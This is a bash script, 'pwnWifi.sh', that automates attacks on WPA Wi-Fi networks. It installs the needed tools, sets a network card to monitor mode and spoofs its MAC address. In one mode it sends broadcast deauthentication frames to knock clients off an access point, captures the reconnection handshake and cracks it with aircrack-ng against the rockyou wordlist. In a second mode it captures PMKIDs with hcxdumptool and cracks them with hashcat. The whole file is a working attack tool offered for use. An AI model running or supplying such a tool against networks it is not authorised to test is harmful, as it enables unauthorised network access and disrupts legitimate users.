#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c() {
  echo -e "\n${redColour}[!]${endColour}${grayColour} Exiting...${endColour}\n"
  airmon-ng stop ${networkCard}mon > /dev/null 2>&1
  rm Capture* 2>/dev/null
  tput cnorm; exit 1
}

function helpPanel(){
  echo -e "\n${yellowColour}[*}${endColour}${grayColour} Usage: ${endColour}${turquoiseColour}./pwnWifi.sh${endColour}\n"
  echo -e "\t${purpleColour}-a)${endColour}${yellowColour} Attack Mode ${endColour}"
  echo -e "\t\t${redColour}Handshake${endColour}"
  echo -e "\t\t${redColour}PKMID${endColour}"
  echo -e "\t${purpleColour}-n)${endColour}${yellowColour} Network Card Name ${endColour}"
  echo -e "\t${purpleColour}-h)${endColour}${yellowColour} Help Panel${endColour}"

  exit 0
}

function dependencies(){
  tput civis
  clear 
  dependencies=(aircrack-ng macchanger xterm hcxdumptool hashcat)
  wordlists_path="/usr/share/wordlists/"

  echo -e "${yellowColour}[*]${endColour}${grayColour} Checking Required Programs...${endColour}"
  sleep 2

  for program in "${dependencies[@]}"; do 
    echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Tool: ${endColour}${purpleColour}$program...${endColour}${grayColour}"
    test -f /usr/bin/$program 
    if [ "$(echo $?)" == "0" ]; then 
      echo -e "${greenColour} (T)${endColour}"
    else
        echo -e "${redColour} (F)${endColour}"
        echo -e "${yellowColour}[*]${endColour}${blueColour} Instaling tool: ${endColour}${purpleColour}$program${endColour}"
        paru -S $program --noconfirm 2> /dev/null  
    fi
    sleep 1
  done

  echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Checking wordlists directory...${endColour}"
  sleep 1;

  if [[ -d "$wordlists_path" ]]; then
    echo -e "${greenColour} (T)${endColour}"
    sleep 2;
  else
    echo -e "${redColour} (F)${endColour}"
    echo -e "${yellowColour}[*]${endColour}${blueColour} Installing wordlists package...${endColour}"
    paru -S wordlists --noconfirm 2>/dev/null
  fi
}

function startAttack(){
  clear

  if [ "$(echo $attack_mode)" == "Handshake" ]; then
    echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring Network Card...${endColour}"
    airmon-ng start $networkCard > /dev/null  2>&1
    ifconfig ${networkCard}mon down && macchanger -a  ${networkCard}mon > /dev/null  2>&1
    ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2 > /dev/null 2>&1
  
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} New MAC address asigned: ${endColour}${purpleColour}( ${endColour}${blueColour}$(macchanger -s  ${networkCard}mon | grep -i "current" | xargs | cut -d " " -f "3-10")${endColour}${purpleColour} )${endColour}"

    xterm -hold -e "airodump-ng ${networkCard}mon" &
    airodump_xterm_PID=$!

    echo -en "${yellowColour}[*]${endColour} ${grayColour}Access point name: ${endColour}" && read apName
    echo -en "${yellowColour}[*]${endColour} ${grayColour}Access point chanel: ${endColour}" && read apChannel
  
    kill -9 $airodump_xterm_PID
    wait $airodump_xterm_PID 2>/dev/null

    xterm -hold -e "airodump-ng -c $apChannel -w Capture --essid $apName ${networkCard}mon" &
    airodump_filter_xterm_PID=$!

    sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
    airplay_PID=$!
    sleep 10; kill -9 $airplay_PID; wait $airplay_PID 2>/dev/null

    sleep 10; kill -9 $airodump_filter_xterm_PID
    wait $airodump_filter_xterm_PID 2>/dev/null

    xterm -hold -e "aircrack-ng -w /usr/share/dict/rockyou.txt Capture-01.cap" &
  elif [ "$(echo $attack_mode)" == "PKMID" ]; then
   
    
    echo -en "\n\n${yellowColour}[*]${endColour}${grayColour} Close the window when you have collected sufficient data.${endColour}"
    xterm -hold -e "hcxdumptool -i $networkCard -w capture.pcapng --rds=1 -F" &
    hcxdump_xterm_PID=$!

    # Wait for the xterm window to close before proceeding
    wait $hcxdump_xterm_PID 2>/dev/null

    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Converting the pcapng file to a text format...${endColour}\n"
    sleep 1;
    hcxpcapngtool -o capture capture.pcapng 

    sleep 3
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Running Hashcat...${endColour}\n"
    hashcat capture /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-withcount.txt --show

    echo -e "\n${greenColour}[+] Process completed.${endColour}\n"

 else
    
    echo -e "\n${redColour}[!] Invalid Attack Mode${endColour}\n"
  fi
}

if [ "$(id -u)" == "0" ]; then
  declare -i parameter_counter=0; while getopts ":a:n:h" arg; do 
    case $arg in 
        a) attack_mode=$OPTARG; let parameter_counter+=1;;  
        n) networkCard=$OPTARG; let parameter_counter+=1;;
        h) helpPanel;;
    esac
  done

  if  [ $parameter_counter -ne 2 ]; then
    helpPanel 
  else 
    dependencies
    startAttack
    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
  fi
else 
  echo -e "\n${redColour}Run as root${endColour}\n"
fi
